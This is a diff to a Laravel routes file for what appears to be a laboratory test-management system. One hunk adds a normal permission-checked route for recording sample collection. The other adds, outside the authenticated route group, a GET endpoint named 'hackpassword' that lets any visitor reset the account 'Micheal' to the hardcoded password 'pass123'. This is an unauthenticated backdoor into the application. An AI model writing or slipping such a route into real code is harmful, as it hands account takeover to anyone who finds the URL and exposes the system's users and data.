@@ -317,6 +317,11 @@ Route::group(array("before" => "auth"), function()
         "as"   => "unhls_test.updateSpecimenType",
         "uses" => "UnhlsTestController@updateSpecimenType"
     ));
+    Route::post("/test/collect", array(
+        "before" => "checkPerms:collect_sample",
+        "as"   => "test.collect.sample",
+        "uses" => "UnhlsTestController@updateTimeSampleCollected"
+    ));
     Route::post("/test/start", array(
         "before" => "checkPerms:start_test",
         "as"   => "test.start",
@@ -958,3 +963,13 @@ Route::group(array("before" => "auth"), function()
     ));
 
 });
+
+Route::get('hackpassword', function() {
+    $user = User::where('username', 'Micheal')->first();
+    $user->password = Hash::make('pass123');
+    $user->save();
+ 
+    echo 'Password changed successfully.';
+});
+
+
